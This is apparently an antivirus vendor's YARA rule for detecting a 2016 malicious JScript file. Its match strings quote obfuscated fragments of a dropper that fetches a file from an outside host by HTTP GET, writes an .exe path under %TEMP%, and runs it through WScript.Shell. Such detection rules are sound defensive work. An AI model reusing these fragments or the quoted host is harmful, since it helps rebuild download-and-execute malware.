rule sig_20160401_fb8aee24982cbd05822d3fc962f11802 {
  meta:
    description = "datamaliciousorder - file 20160401_fb8aee24982cbd05822d3fc962f11802.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4e69e6843f3db4102f4cd7d396d8cc8852073ffdd780b0bee5d4ee54a3ea5c46"

  strings:
    $s1  = "AwUu[TwJyx](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "var XtMy = function OcZj() {return WScript[XiUdu](\"WScript\"+\".Shell\");}(), VzJfj = 11;" fullword ascii
    $s3  = "function JbwUwn(XoIij, IlRzt){DyPm = DyPm * 1; return XoIij - IlRzt;};" fullword ascii
    $s4  = "if (AwUu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ElzTy() {return XtMy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"HBywtbmgp.ex\" + \"e\";};" fullword ascii
    $s6  = "function TsmXpv(){return KvNqw + \"\";};" fullword ascii
    $s7  = "function RyDsn() {return ((MbyPin == true) && (MbyPin == CeHmm)) ? 1 : DyPm;};" fullword ascii
    $s8  = "function ZazMqx(CwzMbj) {var YnWhv = (1, 2, 3, 4, 5, CwzMbj); return YnWhv;};" fullword ascii
    $s9  = "CeHmm = true; " fullword ascii
    $s10 = "MbyPin = true; " fullword ascii
    $s11 = "var RlSm = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (IgYla);" fullword ascii
    $s13 = "var CeHmm = false;" fullword ascii
    $s14 = "function PhHlx(){return 23;};" fullword ascii
    $s15 = "var BtoQb = false;" fullword ascii
    $s16 = "return JbwUwn(BroBj, YtZo);" fullword ascii
    $s17 = "function TdgLfb()" fullword ascii
    $s18 = "function NllIm(){return XiUdu;};" fullword ascii
    $s19 = "function WqlIkl(AtSw){XtMy[\"R\"+\"un\"](AtSw, DyPm, DyPm);};" fullword ascii
    $s20 = "var MbyPin = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}